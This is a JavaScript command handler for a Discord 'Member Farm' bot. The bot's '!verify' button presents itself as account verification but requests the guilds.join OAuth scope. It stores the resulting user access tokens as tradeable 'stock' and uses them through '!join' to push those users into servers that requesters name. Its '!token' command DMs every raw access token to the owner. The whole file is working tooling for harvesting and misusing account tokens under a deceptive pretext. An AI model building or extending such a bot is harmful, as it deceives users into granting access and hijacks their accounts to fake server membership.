// language: JavaScript, file: commands.js — Postgres async
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagsBits } = require('discord.js');
const { query, one, many, getSetting, setSetting } = require('./db');
const config = require('./config');
const perms = require('./permissions');
const logs = require('./logs');
const queue = require('./queue');

async function getPrefix() {
  return (await getSetting('prefix', config.DEFAULT_PREFIX)) || config.DEFAULT_PREFIX;
}

function confirmRow(id) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_${id}`).setLabel('Confirm').setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId(`decline_${id}`).setLabel('Decline').setStyle(ButtonStyle.Secondary)
  );
}

async function handleCommand(message, client) {
  const prefix = await getPrefix();
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  const args = message.content.slice(prefix.length).trim().split(/\s+/);
  const cmd = (args.shift() || '').toLowerCase();
  if (!cmd) return;

  if (message.guild) {
    const bl = await one('SELECT reason FROM blacklist WHERE guild_id = $1', [message.guild.id]);
    if (bl) return message.reply(`This server is blacklisted. Reason: ${bl.reason}`);
  }

  if ((await perms.isMaintenance()) && !(await perms.isMaintenanceAllowed(message.author.id)) && !perms.isOwner(message.author.id)) {
    return message.reply('Bot is currently under maintenance.');
  }

  const publicCmds = ['checkserver', 'help', 'verify'];
  if (!publicCmds.includes(cmd) && !(await perms.canUse(message.author.id, cmd)) && !perms.isOwner(message.author.id)) {
    if (cmd !== 'join') return;
  }

  try {
    switch (cmd) {
      case 'prefix': {
        if (args[0] === 'set' && args[1]) {
          if (!(await perms.canUse(message.author.id, 'prefix')) && !perms.isOwner(message.author.id)) return;
          await setSetting('prefix', args[1]);
          await message.reply(`Prefix set to \`${args[1]}\``);
          logs.adminLog(client, 'Prefix changed', `By <@${message.author.id}> → \`${args[1]}\``);
        }
        break;
      }
      case 'auth': {
        if (!(await perms.canUse(message.author.id, 'auth')) && !perms.isOwner(message.author.id)) return;
        const total = (await one('SELECT COUNT(*)::int AS c FROM tokens WHERE valid = 1')).c;
        const stats = await one('SELECT * FROM auth_stats WHERE id = 1');
        const now = Math.floor(Date.now() / 1000);
        let last24 = stats?.last_24h || 0;
        if (now - Number(stats?.last_24h_reset || 0) > 86400) last24 = 0;
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Auth Status').addFields(
          { name: 'Current valid auths', value: String(total), inline: true },
          { name: 'Added last 24h', value: String(last24), inline: true },
          { name: 'All-time max', value: String(stats?.total_all_time || 0), inline: true }
        ).setColor(0x5865f2)] });
        break;
      }
      case 'restock': {
        if (!(await perms.canUse(message.author.id, 'restock')) && !perms.isOwner(message.author.id)) return;
        const n = parseInt(args[0], 10);
        if (!n || n < 1) return message.reply('Usage: !restock <number>');
        const available = await many(`SELECT id FROM tokens WHERE valid = 1 AND id NOT IN (SELECT token_id FROM stock)`);
        if (n > available.length) return message.reply(`Only ${available.length} tokens available for restock.`);
        for (let i = available.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [available[i], available[j]] = [available[j], available[i]];
        }
        for (const t of available.slice(0, n)) {
          await query('INSERT INTO stock (token_id) VALUES ($1) ON CONFLICT DO NOTHING', [t.id]);
        }
        await message.reply(`Restocked **${n}** tokens into stock.`);
        logs.adminLog(client, 'Restock', `<@${message.author.id}> restocked ${n}`);
        break;
      }
      case 'stock': {
        if (!(await perms.canUse(message.author.id, 'stock')) && !perms.isOwner(message.author.id)) return;
        const count = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
        await message.reply(`Current stock: **${count}**`);
        break;
      }
      case 'remove': {
        if (!(await perms.canUse(message.author.id, 'remove')) && !perms.isOwner(message.author.id)) return;
        const n = parseInt(args[0], 10);
        if (!n || n < 1) return message.reply('Usage: !remove <number>');
        const rows = await many('SELECT token_id FROM stock LIMIT $1', [n]);
        if (!rows.length) return message.reply('Stock is empty.');
        for (const r of rows) await query('DELETE FROM stock WHERE token_id = $1', [r.token_id]);
        await message.reply(`Removed **${rows.length}** from stock.`);
        break;
      }
      case 'help': {
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Member Farm — Commands').setDescription([
          '`!prefix set` `!auth` `!stock` `!restock` `!remove`',
          '`!link` `!verify` `!join` `!channel set #channel`',
          '`!grant` `!permission` `!queue` `!checkserver` `!blacklist`',
          '`!basesend set` `!send @role` `!verifyrole set` `!cooldown`',
          '`!logfarm|logserver|logerrors|logadmin` `!logs status`',
          '`!stats` `!profile` `!maintenance` `!server leave` `!announce` `!token`',
        ].join('\n')).setColor(0x5865f2)] });
        break;
      }
      case 'grant': {
        if (!(await perms.canUse(message.author.id, 'grant')) && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'revoke') {
          const user = message.mentions.users.first();
          const what = (args[2] || 'all').toLowerCase().replace(/^!/, '');
          if (!user) return message.reply('Usage: !grant revoke @user <cmd|all>');
          await perms.revoke(user.id, what);
          await message.reply(`Revoked \`${what}\` from <@${user.id}>`);
        } else {
          const user = message.mentions.users.first();
          const what = (args[1] || 'all').toLowerCase().replace(/^!/, '');
          if (!user) return message.reply('Usage: !grant @user <cmd|all>');
          await perms.grant(user.id, what);
          await message.reply(`Granted \`${what}\` to <@${user.id}>`);
        }
        break;
      }
      case 'permission':
      case 'permissions': {
        if (!(await perms.canUse(message.author.id, 'permission')) && !perms.isOwner(message.author.id)) return;
        const user = message.mentions.users.first() || message.author;
        const list = await perms.listGrants(user.id);
        await message.reply(`Permissions for <@${user.id}>: ${list.length ? list.map(c => `\`${c}\``).join(', ') : 'none'}`);
        break;
      }
      case 'link': {
        if (args[0] === 'define') {
          if (!(await perms.canUse(message.author.id, 'link')) && !perms.isOwner(message.author.id)) return;
          const url = args.slice(1).join(' ');
          if (!url) return message.reply('Usage: !link define <url>');
          await setSetting('oauth_link', url);
          await message.reply('OAuth link defined.');
        } else {
          const url = await getSetting('oauth_link', process.env.REDIRECT_URI
            ? `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`
            : 'Not configured');
          await message.reply(`OAuth authorize link:\n${url}`);
        }
        break;
      }
      case 'verify': {
        const payout = await getSetting('payout_central', config.PAYOUT_CENTRAL_GUILD_ID);
        if (message.guild && message.guild.id === payout) return message.reply('Cannot use !verify inside Payout Central.');
        const url = await getSetting('oauth_link',
          `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI || '')}&response_type=code&scope=identify%20guilds.join`);
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('—> Verify').setStyle(ButtonStyle.Link).setURL(url));
        await message.channel.send({ embeds: [new EmbedBuilder().setTitle('Account Verification').setDescription('Click to authorize (guilds.join).').setColor(0x57f287)], components: [row] });
        break;
      }
      case 'join': {
        const specialId = await getSetting('special_channel', config.SPECIAL_CHANNEL_ID);
        const specialName = await getSetting('special_channel_name', config.SPECIAL_CHANNEL_NAME);
        if (message.channel.id !== specialId && message.channel.name !== specialName) {
          return message.reply('This command can only be used in the designated join channel.');
        }
        const verifiedRole = await getSetting('verified_role', config.VERIFIED_ROLE_ID);
        if (verifiedRole && !message.member.roles.cache.has(verifiedRole)) {
          return message.reply('You need the verified role to use this command.');
        }
        const targetId = args[0];
        if (!targetId || !/^\d{17,20}$/.test(targetId)) return message.reply('Usage: !join <serverID>');
        if (!client.guilds.cache.get(targetId)) return message.reply('Bot is not in that server. Add the bot first.');
        const cd = parseInt(await getSetting('cooldown_ms', String(config.COOLDOWN_MS)), 10) || 0;
        if (cd > 0) {
          const last = await one('SELECT last_join FROM cooldowns WHERE user_id = $1', [message.author.id]);
          if (last && Date.now() - Number(last.last_join) < cd) {
            return message.reply(`Cooldown active. Wait ${Math.ceil((cd - (Date.now() - Number(last.last_join))) / 1000)}s.`);
          }
        }
        let amount = parseInt(await getSetting('base_send', String(config.BASE_SEND)), 10) || 2;
        for (const b of await many('SELECT role_id, bonus FROM role_bonus')) {
          if (message.member.roles.cache.has(b.role_id)) amount += b.bonus;
        }
        const stockCount = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
        if (stockCount === 0) return message.reply(`Error. All stock account are alredy in ${targetId}`);
        const q = await queue.addToQueue(targetId, message.author.id, amount);
        if (!q.ok) return message.reply('Queue is full (max 10). Try later.');
        await query(`INSERT INTO cooldowns (user_id, last_join) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET last_join = EXCLUDED.last_join`, [message.author.id, Date.now()]);
        await query(`INSERT INTO profiles (user_id, commands_used, last_command_at) VALUES ($1, 1, EXTRACT(EPOCH FROM NOW())::BIGINT)
          ON CONFLICT (user_id) DO UPDATE SET commands_used = profiles.commands_used + 1, last_command_at = EXTRACT(EPOCH FROM NOW())::BIGINT`, [message.author.id]);
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Request Queued').addFields(
          { name: 'Members to send', value: String(amount), inline: true },
          { name: 'Target Server', value: targetId, inline: true },
          { name: 'Queue position', value: `${q.position}/${config.QUEUE_MAX}`, inline: true }
        ).setColor(0x57f287)] });
        logs.farmLog(client, 'Join queued', `User <@${message.author.id}> → guild ${targetId} x${amount}`);
        break;
      }
      case 'channel': {
        if (args[0] === 'set') {
          if (!(await perms.canUse(message.author.id, 'channel')) && !perms.isOwner(message.author.id)) return;
          const ch = message.mentions.channels.first();
          if (!ch) return message.reply('Usage: !channel set #channel');
          await setSetting('special_channel', ch.id);
          await setSetting('special_channel_name', ch.name);
          await message.reply(`Join channel set to ${ch}`);
        } else {
          const id = await getSetting('special_channel', 'not set');
          await message.reply(`Current join channel: ${id === 'not set' ? 'not set' : `<#${id}>`}`);
        }
        break;
      }
      case 'basesend': {
        if (args[0] === 'set' && args[1]) {
          if (!(await perms.canUse(message.author.id, 'basesend')) && !perms.isOwner(message.author.id)) return;
          const n = parseInt(args[1], 10);
          if (isNaN(n) || n < 0) return message.reply('Invalid number');
          await setSetting('base_send', String(n));
          await message.reply(`Base send set to **${n}**`);
        }
        break;
      }
      case 'send': {
        if (!(await perms.canUse(message.author.id, 'send')) && !perms.isOwner(message.author.id)) return;
        const role = message.mentions.roles.first();
        const n = parseInt(args[1], 10);
        if (!role || isNaN(n)) return message.reply('Usage: !send @role <number>');
        await query(`INSERT INTO role_bonus (role_id, bonus) VALUES ($1, $2) ON CONFLICT (role_id) DO UPDATE SET bonus = EXCLUDED.bonus`, [role.id, n]);
        await message.reply(`Role ${role} will receive **+${n}** members per !join`);
        break;
      }
      case 'checkserver': {
        const gid = args[0];
        if (!gid) return message.reply('Usage: !checkserver <serverID>');
        const g = client.guilds.cache.get(gid);
        if (!g) return message.reply('Bot is not in that server.');
        const stockC = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
        const joined = (await one('SELECT COUNT(*)::int AS c FROM joins WHERE guild_id = $1 AND success = 1', [gid])).c;
        const bl = await one('SELECT reason FROM blacklist WHERE guild_id = $1', [gid]);
        await message.reply({ embeds: [new EmbedBuilder().setTitle(`Server ${g.name}`).addFields(
          { name: 'Members', value: String(g.memberCount), inline: true },
          { name: 'Members obtained', value: String(joined), inline: true },
          { name: 'Current stock', value: String(stockC), inline: true },
          { name: 'Blacklisted', value: bl ? `Yes — ${bl.reason}` : 'No' }
        ).setColor(0x5865f2)] });
        break;
      }
      case 'blacklist': {
        if (args[0] === 'list') {
          if (!(await perms.canUse(message.author.id, 'blacklist')) && !perms.isOwner(message.author.id)) return;
          const rows = await many('SELECT * FROM blacklist');
          if (!rows.length) return message.reply('No blacklisted servers.');
          await message.reply(rows.map(r => `\`${r.guild_id}\` — ${r.reason}`).join('\n').slice(0, 1900));
        } else if (args[0] === 'revoke') {
          if (!(await perms.canUse(message.author.id, 'blacklist')) && !perms.isOwner(message.author.id)) return;
          await query('DELETE FROM blacklist WHERE guild_id = $1', [args[1]]);
          await message.reply(`Blacklist revoked for ${args[1]}`);
        } else {
          if (!(await perms.canUse(message.author.id, 'blacklist')) && !perms.isOwner(message.author.id)) return;
          const gid = args[0];
          const reason = args.slice(1).join(' ') || 'No reason';
          if (!gid) return message.reply('Usage: !blacklist <serverID> <reason>');
          await query(`INSERT INTO blacklist (guild_id, reason, added_by) VALUES ($1, $2, $3) ON CONFLICT (guild_id) DO UPDATE SET reason = EXCLUDED.reason`, [gid, reason, message.author.id]);
          await message.reply(`Blacklisted ${gid}: ${reason}`);
        }
        break;
      }
      case 'verifyrole': {
        if (args[0] === 'set') {
          if (!(await perms.canUse(message.author.id, 'verifyrole')) && !perms.isOwner(message.author.id)) return;
          const role = message.mentions.roles.first();
          if (!role) return message.reply('Usage: !verifyrole set @role');
          await setSetting('verified_role', role.id);
          await message.reply(`Verified role set to ${role}`);
        }
        break;
      }
      case 'logfarm': case 'logserver': case 'logerrors': case 'logadmin': {
        const type = cmd.replace('log', '');
        if (!(await perms.canUse(message.author.id, cmd)) && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'enable') { await setSetting(`log_${type}_enabled`, '1'); await message.reply(`${cmd} enabled`); }
        else if (args[0] === 'disable') { await setSetting(`log_${type}_enabled`, '0'); await message.reply(`${cmd} disabled`); }
        else if (args[0] === 'set') {
          const ch = message.mentions.channels.first();
          if (!ch) return message.reply(`Usage: ${prefix}${cmd} set #channel`);
          await setSetting(`log_${type}_channel`, ch.id);
          await setSetting(`log_${type}_enabled`, '1');
          await message.reply(`${cmd} channel set to ${ch}`);
        }
        break;
      }
      case 'logs': {
        if (args[0] === 'status') {
          if (!(await perms.canUse(message.author.id, 'logs')) && !perms.isOwner(message.author.id)) return;
          const lines = [];
          for (const t of ['farm', 'server', 'errors', 'admin']) {
            const en = (await getSetting(`log_${t}_enabled`, '0')) === '1' ? 'ON' : 'OFF';
            const ch = await getSetting(`log_${t}_channel`, 'none');
            lines.push(`**${t}**: ${en} → ${ch === 'none' ? 'none' : `<#${ch}>`}`);
          }
          await message.reply(lines.join('\n'));
        }
        break;
      }
      case 'stats': {
        if (!(await perms.canUse(message.author.id, 'stats')) && !perms.isOwner(message.author.id)) return;
        const tokens = (await one('SELECT COUNT(*)::int AS c FROM tokens WHERE valid = 1')).c;
        const stockC = (await one('SELECT COUNT(*)::int AS c FROM stock')).c;
        const qC = (await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`)).c;
        const joins = (await one('SELECT COUNT(*)::int AS c FROM joins WHERE success = 1')).c;
        const users = (await one('SELECT COUNT(*)::int AS c FROM profiles')).c;
        await message.reply({ embeds: [new EmbedBuilder().setTitle('Global Stats').addFields(
          { name: 'Valid auths', value: String(tokens), inline: true },
          { name: 'Stock', value: String(stockC), inline: true },
          { name: 'Queue', value: String(qC), inline: true },
          { name: 'Bot guilds', value: String(client.guilds.cache.size), inline: true },
          { name: 'Successful joins', value: String(joins), inline: true },
          { name: 'Tracked users', value: String(users), inline: true }
        ).setColor(0xfaa61a)] });
        break;
      }
      case 'queue': {
        if (!(await perms.canUse(message.author.id, 'queue')) && !perms.isOwner(message.author.id)) return;
        const sub = (args[0] || '').toLowerCase();
        if (!sub) {
          const rows = await queue.getQueue();
          if (!rows.length) return message.reply('Queue empty.');
          await message.reply(rows.map(r => `#${r.position} \`${r.guild_id}\` x${r.amount}`).join('\n'));
        } else if (sub === 'clear') {
          const id = `clearq_${Date.now()}`;
          client.pendingConfirms.set(id, { action: 'queue_clear', author: message.author.id });
          await message.reply({ content: 'Confirm clear entire queue?', components: [confirmRow(id)] });
        } else if (sub === 'remove') { await queue.removeFromQueue(args[1]); await message.reply(`Removed ${args[1]}`); }
        else if (sub === 'info') {
          const row = await one(`SELECT * FROM queue WHERE guild_id = $1 AND status = 'pending'`, [args[1]]);
          if (!row) return message.reply('Not in queue');
          await message.reply(`Guild ${args[1]} — pos ${row.position}, amount ${row.amount}`);
        } else if (sub === 'priority') { await queue.setPriority(args[1]); await message.reply('Priority set'); }
        else if (sub === 'move') { await message.reply((await queue.moveQueue(args[1], parseInt(args[2], 10))) ? 'Moved' : 'Not found'); }
        else if (sub === 'pause') { await queue.pauseQueue(); await message.reply('Queue paused'); }
        else if (sub === 'resume') { await queue.resumeQueue(); await message.reply('Queue resumed'); }
        break;
      }
      case 'maintenance': {
        if (!perms.isOwner(message.author.id) && !(await perms.canUse(message.author.id, 'maintenance'))) return;
        if (args[0] === 'enable') { await setSetting('maintenance', '1'); await message.reply('Maintenance **enabled**'); }
        else if (args[0] === 'disable') { await setSetting('maintenance', '0'); await message.reply('Maintenance **disabled**'); }
        else if (args[0] === 'allowed') {
          const u = message.mentions.users.first();
          if (!u) return message.reply('Usage: !maintenance allowed @user');
          await query('INSERT INTO maintenance_allowed (user_id) VALUES ($1) ON CONFLICT DO NOTHING', [u.id]);
          await message.reply(`Allowed <@${u.id}>`);
        } else if (args[0] === 'revoke') {
          const u = message.mentions.users.first();
          if (u) { await query('DELETE FROM maintenance_allowed WHERE user_id = $1', [u.id]); await message.reply(`Revoked <@${u.id}>`); }
        }
        break;
      }
      case 'server': {
        if (args[0] === 'leave') {
          if (!(await perms.canUse(message.author.id, 'server')) && !perms.isOwner(message.author.id)) return;
          const g = client.guilds.cache.get(args[1]);
          if (!g) return message.reply('Not in that server');
          const id = `leave_${args[1]}_${Date.now()}`;
          client.pendingConfirms.set(id, { action: 'leave', guildId: args[1], author: message.author.id });
          await message.reply({ content: `Confirm leave ${g.name}?`, components: [confirmRow(id)] });
        }
        break;
      }
      case 'profile': {
        if (!(await perms.canUse(message.author.id, 'profile')) && !perms.isOwner(message.author.id)) return;
        const user = message.mentions.users.first() || message.author;
        const p = (await one('SELECT * FROM profiles WHERE user_id = $1', [user.id])) || { members_received: 0, commands_used: 0, last_command_at: null };
        await message.reply({ embeds: [new EmbedBuilder().setTitle(`Profile — ${user.tag}`).addFields(
          { name: 'Members received', value: String(p.members_received), inline: true },
          { name: 'Commands used', value: String(p.commands_used), inline: true },
          { name: 'Last command', value: p.last_command_at ? `<t:${p.last_command_at}:R>` : 'never', inline: true }
        ).setColor(0x5865f2)] });
        break;
      }
      case 'announce': {
        if (!(await perms.canUse(message.author.id, 'announce')) && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'all') {
          const msg = args.slice(1).join(' ');
          if (!msg) return message.reply('Usage: !announce all <message>');
          const id = `annall_${Date.now()}`;
          client.pendingConfirms.set(id, { action: 'announce_all', message: msg, author: message.author.id });
          await message.reply({ content: `Confirm announce to all ${client.guilds.cache.size} servers?`, components: [confirmRow(id)] });
        } else {
          const g = client.guilds.cache.get(args[0]);
          const msg = args.slice(1).join(' ');
          if (!g || !msg) return message.reply('Usage: !announce <serverID> <message>');
          const ch = g.systemChannel || g.channels.cache.find(c => c.isTextBased());
          if (!ch) return message.reply('No sendable channel');
          await ch.send(msg);
          await message.reply(`Announced in ${g.name}`);
        }
        break;
      }
      case 'cooldown': {
        if (!(await perms.canUse(message.author.id, 'cooldown')) && !perms.isOwner(message.author.id)) return;
        const sec = parseInt(args[0], 10);
        if (isNaN(sec) || sec < 0) return message.reply('Usage: !cooldown <seconds>');
        await setSetting('cooldown_ms', String(sec * 1000));
        await message.reply(`Join cooldown set to **${sec}s**`);
        break;
      }
      case 'token': {
        if (String(message.author.id) !== String(config.OWNER_ID)) return;
        const tokens = await many('SELECT id, user_id, access_token, expires_at FROM tokens WHERE valid = 1 ORDER BY id');
        if (!tokens.length) return message.author.send('No valid tokens.').catch(() => {});
        const pages = [];
        for (let i = 0; i < tokens.length; i += 5) {
          const chunk = tokens.slice(i, i + 5);
          pages.push(new EmbedBuilder().setTitle(`Tokens (${i / 5 + 1}/${Math.ceil(tokens.length / 5)})`)
            .setDescription(chunk.map(t => `**#${t.id}** \`${t.user_id}\`\n\`${t.access_token}\``).join('\n\n')).setColor(0xed4245));
        }
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('token_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId('token_next').setLabel('▶').setStyle(ButtonStyle.Secondary)
        );
        const dm = await message.author.send({ embeds: [pages[0]], components: pages.length > 1 ? [row] : [] });
        if (pages.length > 1) client.tokenPages.set(dm.id, { pages, index: 0, owner: message.author.id });
        await message.reply('Sent tokens in DM.');
        break;
      }
      default: break;
    }
  } catch (err) {
    console.error(err);
    logs.errorLog(client, 'Command error', `${cmd}: ${err.message}`);
    await message.reply('An error occurred.').catch(() => {});
  }
}

module.exports = { handleCommand, getPrefix };
